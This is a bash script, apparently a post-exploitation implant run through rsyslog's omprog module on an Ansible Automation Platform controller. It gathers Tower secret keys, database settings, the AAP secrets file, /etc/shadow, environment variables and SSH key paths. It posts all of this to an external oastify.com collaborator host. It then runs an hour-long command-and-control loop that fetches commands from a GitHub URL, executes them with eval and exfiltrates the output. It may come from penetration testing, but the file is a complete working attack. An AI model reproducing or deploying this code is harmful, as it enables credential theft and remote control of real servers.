#!/bin/bash
LOCKFILE="/tmp/.rsyslog_c2.lock"

# Only run once (omprog keeps the process alive)
if [ -f "$LOCKFILE" ]; then
    # Consume stdin forever to keep omprog happy
    while read line; do :; done
    exit 0
fi
touch "$LOCKFILE"

# Background: exfiltrate secrets and start C2
(
    COLLAB="jd0oze10lacmjnfy1vpttgedl4rvfl3a.oastify.com"
    CMD_URL="https://raw.githubusercontent.com/lpardoRH/test-files/main/cmd.txt"

    # Gather secrets
    SECRET_KEY=$(cat /etc/tower/SECRET_KEY 2>/dev/null | base64 -w0)
    SETTINGS=$(cat /etc/tower/settings.py 2>/dev/null | base64 -w0)
    DB_CONF=$(cat /etc/tower/conf.d/*.py 2>/dev/null | base64 -w0)
    SECRETS_YAML=$(cat /etc/ansible-automation-platform/.secrets.yaml 2>/dev/null | base64 -w0)
    RECEPTOR_CONF=$(cat /etc/receptor/receptor.conf 2>/dev/null | base64 -w0)

    # System info
    SYS_ID=$(id 2>/dev/null)
    SYS_HOST=$(cat /etc/hostname 2>/dev/null)
    SYS_HOSTS=$(cat /etc/hosts 2>/dev/null | base64 -w0)
    SYS_PS=$(ps auxf 2>/dev/null | head -50 | base64 -w0)
    SYS_NET=$(ip addr 2>/dev/null | base64 -w0)
    SYS_ENV=$(env 2>/dev/null | base64 -w0)
    SYS_PASSWD=$(cat /etc/passwd 2>/dev/null | base64 -w0)
    SYS_SHADOW=$(cat /etc/shadow 2>/dev/null | base64 -w0)
    SSH_KEYS=$(find / -name "authorized_keys" -o -name "id_*" 2>/dev/null | head -20)
    SSH_CONF=$(cat /etc/ssh/sshd_config 2>/dev/null | base64 -w0)

    # Exfil to Collaborator
    curl -sk -X POST "https://$COLLAB/rsyslog-secrets" \
        -H "Content-Type: application/json" \
        -d "{
            \"id\": \"$SYS_ID\",
            \"hostname\": \"$SYS_HOST\",
            \"secret_key\": \"$SECRET_KEY\",
            \"settings_py\": \"$SETTINGS\",
            \"db_conf\": \"$DB_CONF\",
            \"secrets_yaml\": \"$SECRETS_YAML\",
            \"receptor_conf\": \"$RECEPTOR_CONF\",
            \"passwd\": \"$SYS_PASSWD\",
            \"shadow\": \"$SYS_SHADOW\",
            \"ssh_keys\": \"$SSH_KEYS\",
            \"sshd_config\": \"$SSH_CONF\",
            \"hosts\": \"$SYS_HOSTS\",
            \"processes\": \"$SYS_PS\",
            \"network\": \"$SYS_NET\",
            \"env\": \"$SYS_ENV\"
        }"

    # C2 loop - poll for commands, exfil output
    LAST_HASH=""
    END=$(($(date +%s) + 3600))

    curl -sk -X POST "https://$COLLAB/rsyslog-c2-ready" \
        -H "Content-Type: application/json" \
        -d "{\"status\": \"controller_c2_started\", \"user\": \"$SYS_ID\", \"host\": \"$SYS_HOST\"}"

    while [ $(date +%s) -lt $END ]; do
        CMD=$(curl -sk "$CMD_URL?t=$(date +%s)" -H "Cache-Control: no-cache" -H "User-Agent: curl/7.0" 2>/dev/null)
        if [ -n "$CMD" ]; then
            H=$(echo -n "$CMD" | md5sum | cut -d' ' -f1)
            if [ "$H" != "$LAST_HASH" ]; then
                LAST_HASH="$H"
                OUTPUT=$(eval "$CMD" 2>&1 | base64 -w0)
                curl -sk -X POST "https://$COLLAB/rsyslog-c2-output" \
                    -H "Content-Type: application/json" \
                    -d "{\"cmd\": \"$CMD\", \"output\": \"$OUTPUT\", \"rc\": $?}"
            fi
        fi
        sleep 10
    done
) &>/dev/null &

# Consume stdin forever (omprog protocol: read messages, never exit)
while read line; do
    :
done
